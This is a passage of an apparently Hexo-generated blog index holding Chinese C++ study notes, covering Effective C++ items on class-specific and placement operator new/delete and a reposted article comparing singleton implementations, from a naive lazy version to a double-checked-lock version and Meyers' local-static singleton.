class="line">        </span><br><span class="line">        <span class="keyword">if</span> (globalHandler) (*globalHandler)();</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">throw</span> std::<span class="built_in">bad_alloc</span>(); <span class="comment">// 没有设置new-handler时，抛出异常</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>考虑继承的情况下，处理好 operator new 和 operator delete 函数。</p><p>原则：针对 class X 而设计的 operator new，其行为很典型地只为<strong>大小刚好为 sizeof(X)</strong> 的对象而设计。而</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span>* <span class="keyword">operator</span> <span class="title">new</span><span class="params">(std::<span class="keyword">size_t</span> size)</span> <span class="title">throw</span><span class="params">(std::bad_alloc)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="keyword">operator</span> <span class="title">delete</span><span class="params">(<span class="keyword">void</span>* rawMemory, std::<span class="keyword">size_t</span> size)</span> <span class="title">throw</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* Base::<span class="keyword">operator</span> <span class="title">new</span><span class="params">(std::<span class="keyword">size_t</span> size)</span> <span class="title">throw</span><span class="params">(std::bac_alloc)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (size != <span class="built_in"><span class="keyword">sizeof</span></span>(Base))</span><br><span class="line">        <span class="keyword">return</span> ::<span class="keyword">operator</span> <span class="built_in"><span class="keyword">new</span></span>(size); <span class="comment">// 如果大小错误，令标准的operator new来处理</span></span><br><span class="line">    <span class="comment">// 以下实现专属于Base的new操作</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> Base::<span class="keyword">operator</span> <span class="title">delete</span><span class="params">(<span class="keyword">void</span>* rawMemory, std::<span class="keyword">size_t</span> size)</span> <span class="title">throw</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (rawMemory == <span class="number">0</span>)<span class="keyword">return</span>;<span class="comment">// 防止npd</span></span><br><span class="line">    <span class="keyword">if</span> (size != <span class="built_in"><span class="keyword">sizeof</span></span>(Base)) &#123;</span><br><span class="line">        ::<span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(rawMemory)</span></span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 以下实现专属于Base的delete操作</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Derived</span> :</span> <span class="keyword">public</span> Base &#123;&#125;;<span class="comment">// 假设Derived未声明operator new</span></span><br><span class="line">Derived *p = <span class="keyword">new</span> Derived;<span class="comment">// 调用Base::operator new</span></span><br></pre></td></tr></table></figure><hr><h3 id="条款-52：写了-placement-new-也要写-placement-delete"><a href="#条款-52：写了-placement-new-也要写-placement-delete" class="headerlink" title="条款 52：写了 placement new 也要写 placement delete"></a>条款 52：写了 placement new 也要写 placement delete</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Widget</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span>* <span class="keyword">operator</span> <span class="title">new</span><span class="params">(std::<span class="keyword">size_t</span> size, std::ostream&amp; logStream)</span> <span class="title">throw</span><span class="params">(std::bac_alloc)</span></span>;<span class="comment">// 非正常形式的new</span></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="keyword">operator</span> <span class="title">delete</span><span class="params">(<span class="keyword">void</span> *pMemory, std::<span class="keyword">size_t</span> size)</span> <span class="title">throw</span><span class="params">()</span></span>; <span class="comment">// 正常形式的class专属delete</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>Widget* pw = new(std::cerr) Widget;</code> // 调用 operator new 并传递 cerr 为其 ostream 实参；这个动作会在 Widget 构造函数抛出异常时泄漏内存</p><blockquote><p>以上操作，如果内存分配成功，而 Widget 构造函数抛出异常，运行期系统有责任取消 operator new 的内存分配并恢复原貌。然而运行期系统无法知道真正被调用的那个 operator new 如何运作，因为它无法取消分配并恢复旧观，所以上述做法行不通。取而代之的是运行期系统寻找 <strong>“参数个数和类型都与 operator new 相同”</strong> 的 operator delete。如果找到，则调用它；否则，没有任何 operator delete 会被调用。在上述的 class Widget 的定义中，没有对应的 placement delete 函数，所以可能会导致内存泄漏。</p></blockquote><p>如果上述的 placement new 操作没有抛出异常，而客户代码中有一个对应的 delete，会发生什么事：</p><p><code>delete pw;</code> // 调用正常的 operator delete</p><p>就如上一行注释所言，调用的是正常形式 operator delete，而非其 placement delete 版本。</p><p><strong>placement delete 只有在 “伴随 placement new 调用而触发的构造函数” 出现异常时才会被调用。</strong>所以我们必须同时提供一个正常的 operator delete 和一个 placement 版本。注意，class 中专属的 news 会掩盖 global news；derived class 中的 operator new 会掩盖 global 版本和继承版本的 operator new。</p><p>解决方案：采用 base class 包含所有正常形式的 new 和 delete，急用继承和 using 声明式在子类中使用。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StandardNewDeleteForms</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// normal new/delete</span></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span>* <span class="keyword">operator</span> <span class="title">new</span><span class="params">(std::<span class="keyword">size_t</span> size)</span> <span class="title">throw</span><span class="params">(std::bad_alloc)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ::<span class="keyword">operator</span> <span class="built_in"><span class="keyword">new</span></span>(size);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="keyword">operator</span> <span class="title">delete</span><span class="params">(<span class="keyword">void</span>* pMemory)</span> <span class="title">throw</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        ::<span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(pMemory)</span></span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">  <span class="comment">// placement new/delete</span></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span>* <span class="keyword">operator</span> <span class="title">new</span><span class="params">(std::<span class="keyword">size_t</span> size, <span class="keyword">void</span>* ptr)</span> <span class="title">throw</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ::<span class="keyword">operator</span> <span class="built_in"><span class="keyword">new</span></span>(size, ptr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="keyword">operator</span> <span class="title">delete</span><span class="params">(<span class="keyword">void</span> *pMemory, <span class="keyword">void</span>* ptr)</span> <span class="title">throw</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ::<span class="keyword">operator</span> <span class="built_in"><span class="keyword">delete</span></span>(pMemory, ptr);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// nothrow new/delete</span></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span>* <span class="keyword">operator</span> <span class="title">new</span><span class="params">(std::<span class="keyword">size_t</span> size, <span class="keyword">const</span> std::<span class="keyword">nothrow_t</span>&amp; nt)</span> <span class="title">throw</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ::<span class="keyword">operator</span> <span class="built_in"><span class="keyword">new</span></span>(size, nt);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="keyword">operator</span> <span class="title">delete</span><span class="params">(<span class="keyword">void</span>* pMemory, <span class="keyword">const</span> std::<span class="keyword">nothrow_t</span>&amp;)</span> <span class="title">throw</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ::<span class="keyword">operator</span> <span class="built_in"><span class="keyword">delete</span></span>(pMemory);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 用户代码</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Widget</span> :</span> <span class="keyword">public</span> StandardNewDeleteForms &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">using</span> StandardNewDeleteForms::<span class="keyword">operator</span> <span class="keyword">new</span>;</span><br><span class="line">    <span class="keyword">using</span> StandardNewDeleteForms::<span class="keyword">operator</span> <span class="keyword">delete</span>;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++ 单例模式总结与剖析（转载）</title>
      <link href="/2022/03/02/interview-singlton/"/>
      <url>/2022/03/02/interview-singlton/</url>
      
        <content type="html"><![CDATA[<blockquote><p>转载自 <a href="https://www.cnblogs.com/sunchaothu/p/10389842.html">C++ 单例模式总结与剖析</a></p></blockquote><h2 id="什么是单例模式"><a href="#什么是单例模式" class="headerlink" title="什么是单例模式"></a>什么是单例模式</h2><p>单例 Singleton 是设计模式的一种，其特点是只提供<strong>唯一</strong>一个类的实例，具有全局变量的特点，在任何位置都可以通过接口获取到那个唯一实例。具体运用场景如：</p><ol><li>设备管理器，系统中可能有多个设备，但是只有一个设备管理器，用于管理设备驱动；</li><li>数据池，用来缓存数据的数据结构，需要在一处写，多处读取或者多处写，多处读取；</li></ol><hr><h2 id="C-单例的实现"><a href="#C-单例的实现" class="headerlink" title="C++ 单例的实现"></a>C++ 单例的实现</h2><h3 id="基础要点"><a href="#基础要点" class="headerlink" title="基础要点"></a>基础要点</h3><ul><li>全局只有一个实例：static 特性，同时禁止用户自己声明并定义实例（把构造函数设为 private）</li><li>线程安全</li><li>禁止赋值和拷贝</li><li>用户通过接口获取实例：使用 static 类成员函数</li></ul><h3 id="C-实现单例的几种方式"><a href="#C-实现单例的几种方式" class="headerlink" title="C++ 实现单例的几种方式"></a>C++ 实现单例的几种方式</h3><h4 id="有缺陷的懒汉式"><a href="#有缺陷的懒汉式" class="headerlink" title="有缺陷的懒汉式"></a>有缺陷的懒汉式</h4><p>懒汉式（Lazy-Initialization）的方法是<strong>直到使用时才实例化对象</strong>，也就说直到调用 <code>get_instance()</code> 方法的时候才 new 一个单例的对象， 如果不被调用就不会占用内存。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="comment">// version1:</span></span><br><span class="line"><span class="comment">// with problems below:</span></span><br><span class="line"><span class="comment">// 1. thread is not safe</span></span><br><span class="line"><span class="comment">// 2. memory leak</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Singleton</span>&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="built_in">Singleton</span>()&#123;</span><br><span class="line">        std::cout&lt;&lt;<span class="string">&quot;constructor called!&quot;</span>&lt;&lt;std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> Singleton* m_instance_ptr;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    ~<span class="built_in">Singleton</span>()&#123;</span><br><span class="line">        std::cout&lt;&lt;<span class="string">&quot;destructor called!&quot;</span>&lt;&lt;std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">Singleton</span>(Singleton&amp;)=<span class="keyword">delete</span>;</span><br><span class="line">    Singleton&amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> Singleton&amp;)=<span class="keyword">delete</span>;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> Singleton* <span class="title">get_instance</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(m_instance_ptr==<span class="literal">nullptr</span>)&#123;</span><br><span class="line">              m_instance_ptr = <span class="keyword">new</span> Singleton;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> m_instance_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">use</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; std::cout &lt;&lt; <span class="string">&quot;in use&quot;</span> &lt;&lt; std::endl; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Singleton* Singleton::m_instance_ptr = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Singleton* instance = Singleton::<span class="built_in">get_instance</span>();</span><br><span class="line">    Singleton* instance_2 = Singleton::<span class="built_in">get_instance</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行的结果是</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">constructor called!</span><br></pre></td></tr></table></figure><p>可以看到，获取了两次类的实例，却只有一次类的构造函数被调用，表明只生成了唯一实例，这是个最基础版本的单例实现，他有哪些问题呢？</p><ol><li><strong>线程安全的问题</strong>：当多线程获取单例时有可能引发竞态条件：第一个线程在 if 中判断 <code>m_instance_ptr</code>是空的，于是开始实例化单例；同时第 2 个线程也尝试获取单例，这个时候判断 <code>m_instance_ptr</code> 还是空的，于是也开始实例化单例；这样就会实例化出两个对象，这就是线程安全问题的由来； <strong>解决办法</strong>：加锁</li><li><strong>内存泄漏</strong>. 注意到类中只负责 new 出对象，却没有负责 delete 对象，因此只有构造函数被调用，析构函数却没有被调用，因此会导致内存泄漏。<strong>解决办法</strong>： 使用共享指针（RAII）;</li></ol><p>因此，这里提供一个改进的，线程安全的、使用智能指针的实现。</p><h4 id="线程安全、内存安全的懒汉式单例-（智能指针，锁）"><a href="#线程安全、内存安全的懒汉式单例-（智能指针，锁）" class="headerlink" title="线程安全、内存安全的懒汉式单例 （智能指针，锁）"></a>线程安全、内存安全的懒汉式单例 （智能指针，锁）</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory&gt;</span> <span class="comment">// shared_ptr</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mutex&gt;</span>  <span class="comment">// mutex</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// version 2:</span></span><br><span class="line"><span class="comment">// with problems below fixed:</span></span><br><span class="line"><span class="comment">// 1. thread is safe now</span></span><br><span class="line"><span class="comment">// 2. memory doesn&#x27;t leak</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Singleton</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">typedef</span> std::shared_ptr&lt;Singleton&gt; Ptr;</span><br><span class="line">    ~<span class="built_in">Singleton</span>()&#123;</span><br><span class="line">        std::cout&lt;&lt;<span class="string">&quot;destructor called!&quot;</span>&lt;&lt;std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">Singleton</span>(Singleton&amp;)=<span class="keyword">delete</span>;</span><br><span class="line">    Singleton&amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> Singleton&amp;)=<span class="keyword">delete</span>;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> Ptr <span class="title">get_instance</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// &quot;double checked lock&quot;</span></span><br><span class="line">        <span class="keyword">if</span>(m_instance_ptr==<span class="literal">nullptr</span>)&#123;</span><br><span class="line">            <span class="function">std::lock_guard&lt;std::mutex&gt; <span class="title">lk</span><span class="params">(m_mutex)</span></span>;</span><br><span class="line">            <span class="keyword">if</span>(m_instance_ptr == <span class="literal">nullptr</span>)&#123;</span><br><span class="line">              m_instance_ptr = std::shared_ptr&lt;Singleton&gt;(<span class="keyword">new</span> Singleton);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> m_instance_ptr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="built_in">Singleton</span>()&#123;</span><br><span class="line">        std::cout&lt;&lt;<span class="string">&quot;constructor called!&quot;</span>&lt;&lt;std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> Ptr m_instance_ptr;</span><br><span class="line">    <span class="keyword">static</span> std::mutex m_mutex;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// initialization static variables out of class</span></span><br><span class="line">Singleton::Ptr Singleton::m_instance_ptr = <span class="literal">nullptr</span>;</span><br><span class="line">std::mutex Singleton::m_mutex;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Singleton::Ptr instance = Singleton::<span class="built_in">get_instance</span>();</span><br><span class="line">    Singleton::Ptr instance2 = Singleton::<span class="built_in">get_instance</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下，发现确实只构造了一次实例，并且发生了析构。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">constructor called!</span><br><span class="line">destructor called!</span><br></pre></td></tr></table></figure><p>shared_ptr 和 mutex 都是 C++11 的标准，以上这种方法的优点是</p><ul><li>基于 shared_ptr，用了 C++ 比较倡导的 RAII 思想，用对象管理资源，当 shared_ptr 析构的时候，new 出来的对象也会被 delete 掉。以此避免内存泄漏。</li><li>加了锁，使用互斥量来达到线程安全。这里使用了两个 if 判断语句的技术称为<strong>双检锁</strong>；好处是，只有判断指针为空的时候才加锁，避免每次调用 get_instance 的方法都加锁，锁的开销毕竟还是有点大的。</li></ul><p>不足之处在于：使用智能指针会要求用户也得使用智能指针，非必要不应该提出这种约束；使用锁也有开销；同时代码量也增多了，实现上我们希望越简单越好。</p><p>还有更加严重的问题，在某些平台（与编译器和指令集架构有关），双检锁会失效！具体可以看<a href="http://www.drdobbs.com/cpp/c-and-the-perils-of-double-checked-locki/184405726">这篇文章</a>，解释了为什么会发生这样的事情。</p><p>因此这里还有第三种的基于 Magic Static 的方法达到线程安全。</p><h4 id="最推荐的懒汉式单例（magic-static）——-局部静态变量"><a href="#最推荐的懒汉式单例（magic-static）——-局部静态变量" class="headerlink" title="最推荐的懒汉式单例（magic static）——  局部静态变量"></a>最推荐的懒汉式单例（magic static）——  局部静态变量</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Singleton</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    ~<span class="built_in">Singleton</span>()&#123;</span><br><span class="line">        std::cout&lt;&lt;<span class="string">&quot;destructor called!&quot;</span>&lt;&lt;std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">Singleton</span>(<span class="keyword">const</span> Singleton&amp;) = <span class="keyword">delete</span>;</span><br><span class="line">    Singleton&amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> Singleton&amp;) = <span class="keyword">delete</span>;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> Singleton&amp; <span class="title">get_instance</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">static</span> Singleton instance;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="built_in">Singleton</span>()&#123;</span><br><span class="line">        std::cout&lt;&lt;<span class="string">&quot;constructor called!&quot;</span>&lt;&lt;std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Singleton&amp; instance_1 = Singleton::<span class="built_in">get_instance</span>();</span><br><span class="line">    Singleton&amp; instance_2 = Singleton::<span class="built_in">get_instance</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">constructor called!</span><br><span class="line">destructor called!</span><br></pre></td></tr></table></figure><p>这种方法又叫做 Meyers’ Singleton <a href="https://stackoverflow.com/questions/449436/singleton-instance-declared-as-static-variable-of-getinstance-method-is-it-thre/449823#449823">Meyer’s 的单例</a>， 是著名的写出《Effective C++》系列书籍的作者 Meyers 提出的。所用到的特性是在 C++11 标准中的 <a href="http://www.open-std.org/jtc1/sc22/wg21/docs/papers/2008/n2660.htm">Magic Static </a>特性：</p><blockquote><p>If control enters the declaration concurrently while the variable is being initialized, the concurrent execution shall wait for completion of the initialization.<br>如果当变量在初始化的时候，并发同时进入声明语句，并发线程将会阻塞等待初始化结束。</p></blockquote><p>这样保证了并发线程在获取静态局部变量的时候一定是初始化过的，所以具有线程安全性。</p><p><a href="https://stackoverflow.com/questions/246564/what-is-the-lifetime-of-a-static-variable-in-a-c-function">C++ 局部静态变量的生存期</a> 是从声明（应该是指第一个执行流经过其时吧）到程序结束，这也是一种懒汉式。</p><p><strong>这是最推荐的一种单例实现方式：</strong></p><ol><li>通过局部静态变量的特性保证了线程安全 （C++11，GCC &gt; 4.3，VS2015 支持该特性）；</li><li>不需要使用共享指针，代码简洁；</li><li>注意在使用的时候需要声明单例的引用 <code>Single&amp;</code> 才能获取对象。</li></ol><p>另外网上有人的实现返回指针而不是返回引用：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> Singleton* <span class="title">get_instance</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> Singleton instance;</span><br><span class="line">    <span class="keyword">return</span> &amp;instance;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样做并不好，理由主要是无法避免用户使用 <code>delete instance</code> 导致对象被提前销毁。还是建议大家使用返回引用的方式。</p><h4 id="函数返回引用"><a href="#函数返回引用" class="headerlink" title="函数返回引用"></a>函数返回引用</h4><p>有人在网上提供了这样一种单例的实现方式：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">A</span>() &#123;</span><br><span class="line">        std::cout&lt;&lt;<span class="string">&quot;constructor&quot;</span> &lt;&lt;std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    ~<span class="built_in">A</span>()&#123;</span><br><span class="line">        std::cout&lt;&lt;<span class="string">&quot;destructor&quot;</span>&lt;&lt;std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">A&amp; <span class="title">ret_singleton</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> A instance;</span><br><span class="line">    <span class="keyword">return</span> instance;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    A&amp; instance_1 = <span class="built_in">ret_singleton</span>();</span><br><span class="line">    A&amp; instance_2 = <span class="built_in">ret_singleton</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>严格来说，这不属于单例了，因为类A只是个寻常的类，可以被定义出多个实例，但是亮点在于提供了 